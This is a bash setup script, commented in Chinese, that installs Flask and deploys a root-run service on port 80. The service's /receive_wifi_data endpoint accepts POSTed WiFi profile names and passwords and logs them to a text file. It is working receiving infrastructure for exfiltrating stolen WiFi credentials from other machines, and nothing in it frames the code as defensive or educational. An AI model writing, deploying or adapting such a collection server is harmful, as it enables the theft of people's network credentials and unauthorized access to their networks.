#!/bin/bash

# 确保脚本以root用户运行
if [ "$(id -u)" -ne 0 ]; then
    echo "请以root用户权限运行此脚本"
    exit 1
fi

# 更新系统包
echo "更新系统包..."
apt-get update && apt-get upgrade -y

# 安装Python3和pip3
echo "安装Python3和pip3..."
apt-get install -y python3 python3-pip

# 安装Flask
echo "安装Flask..."
pip3 install flask

# 创建Flask应用目录
APP_DIR="/opt/flask_app"
mkdir -p $APP_DIR

# 创建Flask应用脚本
echo "创建Flask应用脚本..."
cat > $APP_DIR/app.py << 'EOF'
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/receive_wifi_data', methods=['POST'])
def receive_wifi_data():
    if request.method == 'POST':
        data = request.json
        with open('/opt/flask_app/received_data.txt', 'a') as f:
            for entry in data:
                f.write(f"配置文件: {entry['profile']}\n密码: {entry['password']}\n\n")
        return jsonify({"message": "数据已接收"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
EOF

# 创建服务以后台运行Flask应用
echo "创建系统服务..."
cat > /etc/systemd/system/flask_app.service << EOF
[Unit]
Description=Flask App to receive WiFi data
After=network.target

[Service]
User=root
ExecStart=/usr/bin/python3 $APP_DIR/app.py
WorkingDirectory=$APP_DIR
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# 重新加载systemd，启动并启用Flask应用服务
echo "启动并启用Flask应用服务..."
systemctl daemon-reload
systemctl start flask_app.service
systemctl enable flask_app.service

echo "Flask应用已启动，正在监听端口80"
echo "数据将保存到 $APP_DIR/received_data.txt 中"
